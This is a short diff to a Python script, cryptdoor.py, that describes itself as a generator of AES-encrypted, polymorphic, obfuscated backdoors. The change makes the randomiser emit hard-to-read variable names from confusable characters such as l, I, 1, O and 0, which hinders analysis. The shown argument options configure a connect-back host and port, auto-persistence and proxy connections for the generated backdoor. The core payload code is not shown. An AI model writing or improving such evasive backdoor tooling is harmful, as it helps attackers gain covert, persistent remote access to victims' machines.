@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #
-# cryptdoor.py - AES encrypted polymorphic backdoor
+# cryptdoor.py - AES encrypted polymorphic obfuscated backdoor
 # by @d4rkcat github.com/d4rkcat
 #
 ## This program is free software: you can redistribute it and/or modify
@@ -21,7 +21,10 @@ def randKey(bytes):
 	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
 
 def randVar():
-	return random.choice('lI') + ''.join(random.choice('I1l') for x in range(random.randint(14,16)))
+	if random.choice('IO') == 'I':
+		return random.choice('lIi') + ''.join(random.choice('I1li') for x in range(random.randint(15,20)))
+	else:
+		return random.choice('oO') + ''.join(random.choice('oO0') for x in range(random.randint(15,20)))
 
 def frot(string):
 	return string.encode('rot13').encode('base64').replace('=', '').replace('\n', '')
@@ -29,7 +32,7 @@ def frot(string):
 parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [options]')
 parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
 parser.add_argument("-p", "--port", type=str, help="Port.")
-parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of source code.')
+parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of backdoor source code.')
 parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
 parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
 parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
